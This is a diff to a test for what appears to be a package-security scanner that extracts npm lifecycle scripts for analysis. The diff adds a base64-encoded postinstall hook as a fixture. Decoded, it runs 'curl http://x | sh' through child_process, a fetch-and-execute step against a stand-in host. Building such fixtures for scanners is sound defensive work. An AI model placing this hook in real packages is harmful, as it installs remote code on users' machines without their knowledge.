@@ -58,7 +58,7 @@ with tempfile.TemporaryDirectory() as d:
 with tempfile.TemporaryDirectory() as d:
     root = Path(d, "x-1.0.0.tgz.unpacked", "package")
     root.mkdir(parents=True)
-    (root / "package.json").write_text(json.dumps({"scripts": {"postinstall": "node -e \"eval(atob('eA=='))\"", "test": "jest"}}))
+    (root / "package.json").write_text(json.dumps({"scripts": {"postinstall": "node -e \"eval(atob('cmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWNTeW5jKCdjdXJsIGh0dHA6Ly94IHwgc2gnKQ=='))\"", "test": "jest"}}))
     out = npm.write_lifecycle(list(Path(d).rglob("*")), Path(d), "x-1.0.0")
     assert sorted(f.name for f in out) == ["package.json#postinstall.js", "package.json#postinstall.sh"], out
     f = se.ScanFeatures(name="x", version="1.0.0", ecosystem="npm")
